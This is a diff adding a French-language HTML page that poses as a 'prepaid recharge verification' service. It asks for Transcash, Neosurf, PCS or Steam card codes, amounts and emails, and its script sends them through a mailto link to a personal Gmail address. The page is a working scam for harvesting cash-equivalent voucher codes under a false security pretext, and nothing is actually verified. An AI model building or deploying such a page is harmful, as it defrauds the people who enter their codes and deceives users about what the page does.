@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Vérification Recharge Prépayée</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+  body {
+    margin: 0;
+    font-family: 'Montserrat', sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: #fff;
+  }
+  .container {
+    background: rgba(255,255,255,0.1);
+    padding: 2.5rem 3rem;
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+    width: 350px;
+  }
+  h1 {
+    text-align: center;
+    margin-bottom: 1.5rem;
+    font-weight: 700;
+    letter-spacing: 1.2px;
+  }
+  label {
+    display: block;
+    margin-bottom: 0.3rem;
+    font-weight: 600;
+    font-size: 0.9rem;
+  }
+  select, input[type="text"], input[type="email"], input[type="number"] {
+    width: 100%;
+    padding: 0.5rem 0.75rem;
+    margin-bottom: 1.2rem;
+    border-radius: 8px;
+    border: none;
+    font-size: 1rem;
+    outline: none;
+    transition: box-shadow 0.3s ease;
+  }
+  select:focus, input:focus {
+    box-shadow: 0 0 6px 3px rgba(118,75,162, 0.6);
+  }
+  button {
+    width: 100%;
+    padding: 0.75rem;
+    background: #764ba2;
+    border: none;
+    border-radius: 8px;
+    font-weight: 700;
+    font-size: 1.1rem;
+    letter-spacing: 1px;
+    color: white;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: #667eea;
+  }
+  .error {
+    color: #ff6b6b;
+    font-size: 0.85rem;
+    margin-top: -1rem;
+    margin-bottom: 1rem;
+  }
+  .footer {
+    text-align: center;
+    margin-top: 1rem;
+    font-size: 0.8rem;
+    color: #ddd;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>Vérification Recharge</h1>
+    <form id="rechargeForm" novalidate>
+      <label for="typeRecharge">Type de recharge</label>
+      <select id="typeRecharge" name="typeRecharge" required>
+        <option value="" disabled selected>Choisissez un type</option>
+        <option value="Transcash">Transcash</option>
+        <option value="Néo Surf">Néo Surf</option>
+        <option value="PCS">PCS</option>
+				
+        <option value="Steam Carte">Steam Carte</option>
+      </select>
+      <div class="error" id="typeError"></div>
+
+      <label for="montant">Montant</label>
+      <input type="number" id="montant" name="montant" placeholder="Entrez le montant" min="1" required />
+      <div class="error" id="montantError"></div>
+
+      <label for="email">Adresse mail</label>
+      <input type="email" id="email" name="email" placeholder="votre@email.com" required />
+      <div class="error" id="emailError"></div>
+
+      <label for="codeRecharge">Code de la recharge</label>
+      <input type="text" id="codeRecharge" name="codeRecharge" placeholder="Entrez le code" required />
+      <div class="error" id="codeError"></div>
+
+      <button type="submit">Vérifier</button>
+    </form>
+    <div class="footer">Votre sécurité est notre priorité</div>
+  </div>
+
+<script>
+  const form = document.getElementById('rechargeForm');
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    // Clear errors
+    document.getElementById('typeError').textContent = '';
+    document.getElementById('montantError').textContent = '';
+    document.getElementById('emailError').textContent = '';
+    document.getElementById('codeError').textContent = '';
+
+    let valid = true;
+
+    // Validate type recharge
+    const type = form.typeRecharge.value;
+    if (!type) {
+      document.getElementById('typeError').textContent = 'Veuillez sélectionner un type de recharge.';
+      valid = false;
+    }
+
+    // Validate montant
+    const montant = form.montant.value.trim();
+    if (!montant || isNaN(montant) || Number(montant) <= 0) {
+      document.getElementById('montantError').textContent = 'Veuillez entrer un montant valide.';
+      valid = false;
+    }
+
+    // Validate email
+    const email = form.email.value.trim();
+    const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+    if (!email || !emailPattern.test(email)) {
+      document.getElementById('emailError').textContent = 'Veuillez entrer une adresse email valide.';
+      valid = false;
+    }
+
+    // Validate code recharge
+    const code = form.codeRecharge.value.trim();
+    if (!code) {
+      document.getElementById('codeError').textContent = 'Veuillez entrer le code de la recharge.';
+      valid = false;
+    }
+
+    if (!valid) return;
+
+    // Build mailto link
+    const emailRecipient = 'abrahamkyles15@gmail.com';
+    const subject = encodeURIComponent('Vérification de recharge');
+    const body = encodeURIComponent(
+      'Type de recharge: ' + type + '\n' +
+      'Montant: ' + montant + '\n' +
+      'Adresse mail: ' + email + '\n' +
+      'Code de la recharge: ' + code + '\n'
+    );
+
+    // Open mail client
+    window.location.href = `mailto:${emailRecipient}?subject=${subject}&body=${body}`;
+  });
+</script>
+</body>
+</html>
